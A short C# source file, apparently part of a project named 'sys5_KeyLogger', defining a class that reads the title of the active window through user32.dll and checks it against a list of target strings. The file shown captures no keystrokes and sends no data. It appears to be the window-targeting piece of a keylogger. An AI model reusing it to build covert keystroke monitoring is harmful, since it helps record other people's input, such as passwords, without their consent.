using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace sys5_KeyLogger
{
	public class WindowTitleChecker
	{
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		public List<string> WindowsTitles { get; set; }

		public WindowTitleChecker()
		{
			WindowsTitles = new List<string>();
		}

		public WindowTitleChecker(ICollection<string> titlesArray) : this()
		{
			WindowsTitles.AddRange(titlesArray);
		}

		public void Add(string s)
		{
			WindowsTitles.Add(s);
		}

		public bool Check()
		{
			IntPtr handle = GetForegroundWindow();
			int chars = 512;
			StringBuilder buff = new StringBuilder(chars);
			if (GetWindowText(handle, buff, chars) > 0)
			{
				string line = buff.ToString();
				return (WindowsTitles.FirstOrDefault(str => line.Contains(str)) != null);
			}

			return false;
		}
	}
}
